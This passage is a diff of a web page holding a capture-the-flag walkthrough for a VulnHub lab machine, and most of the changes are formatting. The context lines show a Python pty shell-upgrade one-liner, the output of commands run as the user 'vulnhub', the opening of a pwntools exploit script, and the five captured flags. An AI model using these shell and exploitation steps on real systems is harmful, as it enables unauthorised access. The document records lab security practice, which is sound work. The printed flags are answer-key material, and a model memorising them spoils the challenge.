+</code></pre><pre><code>python -c 'import pty; pty.spawn(&quot;/bin/sh&quot;)'
 $ id
 id
 uid=1000(vulnhub) gid=1000(vulnhub) groups=1000(vulnhub),24(cdrom),25(floppy),27(sudo),29(audio),30(dip),44(video),46(plugdev),108(netdev)
@@ -875,17 +724,14 @@ cat .my_loot/flag.txt
                  .-&quot;-.
                 / 4 4 \
                 \_ v _/
-                //   \\      
+                //   \\
                ((     ))
          =======&quot;&quot;===&quot;&quot;=======
                   |||
                   '|'
 
       FLAG{i_tot_i_saw_a_puddy_tat}
-</code></pre>
-
-<p>Code:</p>
-
+</code></pre><p>Code:</p>
 <pre><code>#!/usr/bin/env python2
 
 from pwn import *
@@ -1101,23 +947,15 @@ pause()
 
 if local:
     p_main.close()
-</code></pre>
-
-<h1 id="charlie">charlie</h1>
-
+</code></pre><h1 id="charlie">charlie</h1>
 <p>Getting charlies flag was straightforward</p>
-
 <pre><code>$ cd /home/charlie
 cd charlie
 $ cat flag.txt
 cat flag.txt
 FLAG{i_haz_sriracha_ice_cream}
-</code></pre>
-
-<p>Finally all 5 flags after a lot of fun hours exploiting the binaries :)</p>
-
+</code></pre><p>Finally all 5 flags after a lot of fun hours exploiting the binaries :)</p>
 <p>All 5 flags:</p>
-
 <pre><code>FLAG{ARSE_REQUEST}
 FLAG{is_there_an_ivana_tinkle}
 FLAG{tr3each3ry_anD_cUnn1ng}
@@ -1135,7 +973,7 @@ FLAG{i_haz_sriracha_ice_cream}
         </ul>
     </div>
 </div>
-<script type="text/javascript" src='https://firefart.at/js/all.min.js'></script>
+<script type="text/javascript" src='https://firefart.at/js/all.js'></script>
 <script type="text/javascript" src='https://firefart.at/js/firefart.js'></script>
 
 <script type="text/javascript">
@@ -1144,19 +982,27 @@ FLAG{i_haz_sriracha_ice_cream}
     _paq.push(["setCookieDomain", "*.firefart.at"]);
     _paq.push(['trackPageView']);
     _paq.push(['enableLinkTracking']);
-    (function() {
-        var u="https://tracking.firefart.at/";
-        _paq.push(['setTrackerUrl', u+'mat.php']);
+    (function () {
+        var u = "https://tracking.firefart.at/";
+        _paq.push(['setTrackerUrl', u + 'mat.php']);
         _paq.push(['setSiteId', '1']);
-        var d=document, g=d.createElement('script'), s=d.getElementsByTagName('script')[0];
-        g.type='text/javascript'; g.async=true; g.defer=true; g.src=u+'mat.js'; s.parentNode.insertBefore(g,s);
+        var d = document,
+            g = d.createElement('script'),
+            s = d.getElementsByTagName('script')[0];
+        g.type = 'text/javascript';
+        g.async = true;
+        g.defer = true;
+        g.src = u + 'mat.js';
+        s.parentNode.insertBefore(g, s);
     })();
 </script>
-<noscript><p><img src="https://tracking.firefart.at/mat.php?idsite=1&amp;rec=1" style="border:0;" alt="" /></p></noscript>
-
+<noscript>
+    <p><img src="https://tracking.firefart.at/mat.php?idsite=1&amp;rec=1" style="border:0;" alt="" /></p>
+</noscript>
 
         </div>
     </div>
 </div>
 </body>
+
 </html>
